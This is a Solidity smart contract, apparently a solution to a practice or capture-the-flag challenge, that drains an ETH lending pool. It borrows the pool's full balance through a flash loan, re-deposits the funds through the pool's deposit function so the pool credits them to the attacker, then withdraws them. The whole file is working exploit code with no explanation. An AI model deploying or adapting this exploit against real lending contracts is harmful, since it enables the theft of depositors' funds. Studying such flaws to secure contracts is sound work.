// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

interface IEthLendingPool {
    function balances(address) external view returns (uint256);
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
    function flashLoan(uint256 amount, address target, bytes calldata data)
        external;
}

contract EthLendingPoolExploit {
    IEthLendingPool public pool;

    constructor(address _pool) {
        pool = IEthLendingPool(_pool);
    }

    function pwn() external {
        // this function will be called
        pool.flashLoan(address(pool).balance, address(this), abi.encodeWithSignature("deposit()"));
        pool.withdraw(pool.balances(address(this)));
    }
    
    function deposit() external payable {
        pool.deposit{value: msg.value}();
    }
    
    receive() external payable {}
    
}